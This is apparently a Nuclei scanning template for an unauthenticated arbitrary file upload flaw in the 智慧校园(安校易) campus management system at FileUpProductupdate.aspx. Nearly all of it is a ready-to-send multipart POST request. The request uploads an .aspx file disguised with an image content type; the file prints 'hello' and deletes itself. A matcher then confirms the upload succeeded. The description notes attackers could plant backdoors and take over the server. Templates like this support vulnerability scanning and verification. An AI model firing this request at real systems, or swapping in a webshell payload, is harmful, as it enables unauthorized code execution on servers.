id: zhihuizonghe-FileUpProductupdate-upload
info:
  name: Template Name
  author: apple
  severity: critical
  description: 智慧校园(安校易)管理系统 FileUpProductupdate.aspx 接口处存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%99%BA%E6%85%A7%E6%A0%A1%E5%9B%AD(%E5%AE%89%E6%A0%A1%E6%98%93)%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FFileUpProductupdate.aspx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
http:
  - raw:
      - |-
        POST /Module/FileUpPage/FileUpProductupdate.aspx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2,
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
        Connection: close

        ------21909179191068471382830692394
        Content-Disposition: form-data; name="Filedata"; filename="qaz.aspx"
        Content-Type: image/jpeg

        <%@Page Language="C#"%><%Response.Write("hello");System.IO.File.Delete(Request.PhysicalPath);%>
        ------21909179191068471382830692394--
    matchers:
      - type: word
        part: body
        words:
          - '.aspx'
